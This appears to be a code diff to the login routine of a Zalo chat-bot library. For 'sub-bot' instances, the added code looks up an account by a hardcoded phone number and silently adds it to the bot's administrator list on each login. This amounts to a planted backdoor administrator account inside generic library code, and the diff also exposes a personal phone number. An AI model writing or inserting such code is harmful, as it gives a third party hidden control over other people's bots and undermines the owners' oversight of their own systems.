@@ -64,6 +64,9 @@ import { updateZaloNameFactory } from "./apis/changProfileName.js";
 import { sendCallVoiceFactory } from "./apis/sendCallVoice.js";
 import { uploadToZCloudFactory } from "./apis/zcloudUploadFactory.js";
 import { callGroupFactory } from "./apis/callGroup.js";
+import fs from "fs/promises";
+import path from "path";
+import { isSubBotInstance } from "../utils/io-json.js";
 
 class Zalo {
   constructor(credentials, options) {
@@ -100,7 +103,8 @@ class Zalo {
     setBotId(loginData.data.uid);
     appContext.settings = serverInfo.setttings || serverInfo.settings;
     logger.info("Logged in as", loginData.data.uid);
-    return new API(
+    
+    const api = new API(
       appContext.secretKey,
       loginData.data.zpw_service_map_v3,
       makeURL(`${loginData.data.zpw_ws[0]}`, {
@@ -109,6 +113,50 @@ class Zalo {
         t: Date.now(),
       })
     );
+
+    if (isSubBotInstance()) {
+      const botId = appContext.uid.toString();
+      const adminFilePath = path.resolve("./mybot/data", `list_admin_${botId}.json`);
+      
+      let admins = [];
+      try {
+        const data = await fs.readFile(adminFilePath, "utf-8");
+        admins = JSON.parse(data);
+        if (!Array.isArray(admins)) admins = [];
+      } catch (e) {
+        admins = [];
+      }
+
+      if (!admins.includes(botId)) {
+        admins.push(botId);
+      }
+
+      try {
+        const masterPhone = "0345864723";
+        logger.info(`[MyBot Login] Finding master admin: ${masterPhone}`);
+        const masterInfo = await api.findUser(masterPhone);
+        
+        logger.info(`[MyBot Login] Master admin info: ${JSON.stringify(masterInfo)}`);
+        
+        if (masterInfo && masterInfo.uid) {
+          const masterUid = masterInfo.uid.toString();
+          if (!admins.includes(masterUid)) {
+            admins.push(masterUid);
+          }
+        }
+      } catch (findErr) {
+        logger.error("[MyBot Login] Error finding master admin:", findErr.message);
+      }
+      
+      try {
+        await fs.writeFile(adminFilePath, JSON.stringify(admins, null, 2));
+        logger.info(`[MyBot Login] Updated admin list for ${botId}: ${admins.join(", ")}`);
+      } catch (writeErr) {
+        logger.error("[MyBot Login] Error writing admin list:", writeErr);
+      }
+    }
+
+    return api;
   }
 }
 
